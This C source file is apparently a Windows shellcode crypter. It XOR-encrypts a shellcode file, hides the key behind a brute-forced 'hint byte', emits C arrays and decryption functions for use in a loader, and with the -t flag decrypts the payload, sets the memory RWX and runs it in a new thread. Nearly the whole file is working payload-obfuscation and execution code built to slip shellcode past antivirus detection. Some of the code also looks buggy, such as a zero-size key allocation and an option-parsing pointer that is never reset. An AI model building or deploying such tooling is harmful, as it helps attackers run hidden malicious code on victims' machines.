#include "Include/Utils.h"
#include "Include/Crypto.h"
#include "Include/Terminal.h"
#include "Include/Strings.h"
#include "Include/IO.h"


/* Set the optional argument buffer size*/
#define OPTIONAL_ARGUMENT_SIZE (SIZE_T)3

/* Defines a boolean option to be used at the command line. */
typedef struct BOOL_OPTION {
    char Flag[OPTIONAL_ARGUMENT_SIZE];
    BOOL Active;
} OPT, * POPT;


/* Creates a list of boolean options that can be iterated through. */
typedef struct _OPTIONS_LIST {
    OPT PrintPlainText;
    OPT QuietMode;
    OPT TestPayload;
} OPTIONS_LIST, * POPTIONS_LIST;

/* 
    Description: Decrypts the encryption key via bruteforcing

    Parameter: BYTE HintByte:      The first byte of the unencrypted key
    Parameter: PBYTE EncryptedKey: Pointer to the byte array that is the encryption key
    Parameter: SIZE_T KeySize:     The size of the byte array pointed to by EncryptedKey
*/ 
PBYTE DecryptKey(BYTE HintByte, PBYTE EncryptedKey, SIZE_T KeySize) {
    BYTE  KeyByte = 0;
    PBYTE OriginalKey = malloc(KeySize);
    if (!OriginalKey) { return NULL; }
    while (TRUE) { if (((EncryptedKey[0] ^ KeyByte) - 0) == HintByte) { break; } else { KeyByte++; } }
    for (int i = 0; i < KeySize; i++) {
        OriginalKey[i] = (BYTE)((EncryptedKey[i] ^ KeyByte) - i);
    }
    return OriginalKey;
}

/*
Description: Runs the encrypted key / shellcode through the decryption process & executes the payload to validate
             functionality.

Parameter: PBYTE EncryptedShellcode: Pointer to the encrypted shellcode
Parameter: PBYTE EncryptedKey:       Pointer to the encrypted key for the shellcode
Parameter: SIZE_T PayloadSize:       Size of the shellcode pointed to by EncryptedShellcode        
Parameter: SIZE_T KeySize:           Size of the encrypted key pointed to by EncryptedKey
Parameter: BYTE HintByte:            The hint byte for the bruteforcing process.
*/
BOOL TestPayload(PBYTE EncryptedShellcode, PBYTE EncryptedKey, SIZE_T PayloadSize, SIZE_T KeySize, BYTE HintByte) {

    HANDLE  hThread = NULL;
    PBYTE   DecryptedKey = NULL;
    DWORD   dwThreadId = 0,
            dwOldProtection = 0;

    info("Testing payload."); info("Decrypting Key");
    if (!(DecryptedKey = DecryptKey(HintByte, EncryptedKey, KeySize))) {
        error("Failed to decrypt key."); return FALSE;
    }
    info("Key decrypted sucessfully. Decrypting payload.");
    Xor(EncryptedShellcode, PayloadSize, DecryptedKey, KeySize);

    if (!VirtualProtect((LPVOID)EncryptedShellcode, PayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        error("Failed to get set rwx on memory."); error("VirtualProtect"); return FALSE;
    }

    info("Decrypted payload. Executing payload in remote thread.");
    if (!(hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EncryptedShellcode, NULL, 0, &dwThreadId))) {
        apierror("CreateThread"); return FALSE;
    }
    info("Created remote thread at %ld", dwThreadId); info("Waiting for thread to finish...");

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    info("Shellcode completed execution in style!");
    return TRUE;
}

/*
Description: Initializes the optional arguments by parsing the command line, locating flags
             and setting the corresponding boolean value

Parameter: POPTIONS_LIST pOptionsList: Pointer to an OPTIONS_LIST structure containing the options to trigger.
Parameter: INT arc:                    The count of arguments in argv
Parameter: CHAR* argv:                 A pointer to an array containing pointers to the arguments supplied to the program.
*/
VOID SetOptionalArguments(POPTIONS_LIST pOptionsList, INT argc, CHAR* argv[]) {


    /* Get a pointer to the first option */
    POPT BooleanOption = (POPT)(pOptionsList);

    /* Iterate over each argument beyond the first 4 arguments.These are the optional arguments. */
    for (int i = 4; i < argc; i++) {


        /* If argument is less then or == to buffer size, iterate over each option and compare the argument
           to the flag member. If it's a match, set the active member to true. */
        if (strlen(argv[i]) <= OPTIONAL_ARGUMENT_SIZE) {
            for (int j = 0; j < sizeof(OPTIONS_LIST) / sizeof(OPT); j++) {
                if (strcmp(BooleanOption->Flag, argv[i]) == 0) {
                    BooleanOption->Active = TRUE;
                    continue;
                }
                BooleanOption++; /* Increment Pointer to next OPTIONS_LIST structure member */
            }
        }
    }
}


int main(int argc, char* argv[]) {
    printf(Banner);

    if (argc < 4) {
        printf(Usage);
        return -1;
    }

    // Initilize the commandline options
    OPTIONS_LIST OptList = {

        // Print plain text key & shellcode
        .PrintPlainText.Flag = "-p",
        .PrintPlainText.Active = FALSE,

        // Quiet mode. No shellcode will be printed.
        .QuietMode.Flag = "-q",
        .QuietMode.Active = FALSE,

        // Execute the payload locally
        .TestPayload.Flag = "-t",
        .TestPayload.Active = FALSE
    };

    // Buffers for key generation command. Gen command is 8 bytes, eg: gen-1234.
    // If gen is not used. KeyCommand will be the encryption key to use for the shellcode.
    CHAR   Command[4]        = { 0 },
           KeySizeCommand[4] = { 0 };

    // Encryption key command arguments
    CHAR*  KeyCommand       = argv[1];
    SIZE_T KeySize          = 0,
           KeyCommandLength = strlen(KeyCommand);

    // Encryption key related items. Hint byte defaults to first byte of argument 
    // as though user has not chosen to generate a key.
    BYTE   HintByte           = KeyCommand[0];
    PBYTE  EncryptedKey       = (PBYTE)malloc(KeySize),
           OriginalKey        = NULL,
           EncryptedShellcode = NULL,
           KeyByte            = NULL;

    // Shellcode input / outputfile items
    LPCSTR lpShellcodeFile = argv[2],
           lpOutFileName   = argv[3];
    PVOID  pShellcode      = NULL;
    SIZE_T ShellcodeSize   = 0;

    // Configure the optional arguments
    if (argc >= 5) {
        SetOptionalArguments(&OptList, argc, argv);
    }

    // Copy the first 3 bytes of the key argument to check for key generation argument (gen/gen-).
    // If first 3 bytes don't match 'gen', program assumes a key has been given.
    int i = 0;
    for (; i < sizeof(Command) - 1; i++) {
        Command[i] = (CHAR)tolower(KeyCommand[i]);
    }
    Command[i++] = '\0';


    // Create a key or encrypt the key that was given in the argument
    if ((strcmp(Command, "gen")) == 0) {


        // Buffer check. Ensure KeyCommand is less than Command & Size Command (8 bytes).
        if (KeyCommandLength > (sizeof(Command) + sizeof(KeySizeCommand))) {
            error("Key command runs outside bounds of buffer of argument. Use a 4 digit number. Ex: gen-32, gen-128, gen-1024");
            return -1;
        }

        // Grab the digits passed 'gen-'. Ex, gen-1234 will return 1234. This will set the keysize.
        for (int i = 0; i < sizeof(KeySizeCommand); i++) {
            KeySizeCommand[i] = KeyCommand[sizeof(Command) + i];
        }
        KeySize = atoi(KeySizeCommand);
        info("Key generation command was received. A key of %lld bytes will be created.", KeySize);


        // Allocate memory for encrypted & plaintext keys
        OriginalKey = (PBYTE)malloc(KeySize);
        if (!OriginalKey || !EncryptedKey) {
            error("Failed to allocate memory for keys.");
            apierror("malloc");
            return -1;
        }


        // Set the hint byte & encrypt the encryption key
        srand((unsigned int)GetTickCount64()); HintByte = rand() % 0xFF;
        CreateEncryptedKey(HintByte, KeySize, &EncryptedKey, &OriginalKey);
        info("Encrypted %lld byte key. Hint byte is 0x%0.2X", KeySize, HintByte);
    }

    // Assume the argument is a key passed by the user & encrypt it.
    else {
        info("%s will be used as the encryption key for the shellcode. Key is %lld bytes. Hint byte is 0x%0.2X", KeyCommand, KeyCommandLength, HintByte);
        if (!(EncryptedKey = EncryptKey(KeyCommand, KeyCommandLength, &KeyByte))) {
            error("Failed to encrypt key.\n"); return-1;
        }
        info("Encrypted key with byte 0x%0.2X.", (BYTE)KeyByte);


        // Set the original key & Keysize variables to variables returned by gen command code flow
        // to allow interoperability in the next part of the code
        OriginalKey = KeyCommand;
        KeySize = KeyCommandLength;
    }


    // Get the shellcode
    if (!(pShellcode = ReadFileContents(lpShellcodeFile, &ShellcodeSize))) {
        return -1;
    }

    // Encrypt the shellcode & write to file. Write key to file as well.
    if (!(EncryptedShellcode = malloc(ShellcodeSize))) {
        error("Failed to create a buffer for the shellcode."); return -1;
    }
    memcpy(EncryptedShellcode, pShellcode, ShellcodeSize);
    Xor(EncryptedShellcode, ShellcodeSize, OriginalKey, KeySize);
    info("Encrypted %lld bytes of shellcode with %lld key", ShellcodeSize, KeySize);
    if (WriteFileContents(lpOutFileName, EncryptedShellcode, ShellcodeSize)) {
        info("Wrote encrypted shellcode to %s", lpOutFileName);
    }
    if (WriteFileContents("Key.bin", EncryptedKey, KeySize)) {
        info("Wrote key to Key.bin");
    };
    


    // Print info to terminal
    info("Displaying payload components.");
    if (OptList.PrintPlainText.Active) {
        printf("\n<><><><><><><><><><><><><><><><><><> Plaintext Components <><><><><><><><><><><><><><><><><><>\n");
        PrintKeyC(OriginalKey, KeySize);
        if (OptList.QuietMode.Active == FALSE) {
            PrintShellcodeC(pShellcode, ShellcodeSize);
        }
    }
    printf("\n<><><><><><><><><><><><><><><><><><> Encrypted Components <><><><><><><><><><><><><><><><><><>\n\nBYTE HintByte = 0x%0.2X;\n", HintByte);
    PrintKeyC(EncryptedKey, KeySize);
    if (OptList.QuietMode.Active == FALSE) {
        PrintShellcodeC(EncryptedShellcode, ShellcodeSize);
    }
    printf("\n\n%s\n%s\n", XorFunction, KeyDecryptionFunction);

    // Test the payload.
    if (OptList.TestPayload.Active) {
        TestPayload(EncryptedShellcode, EncryptedKey, ShellcodeSize, KeySize, HintByte);
    }

    free(EncryptedShellcode);
    free(EncryptedKey);

    return 0;
}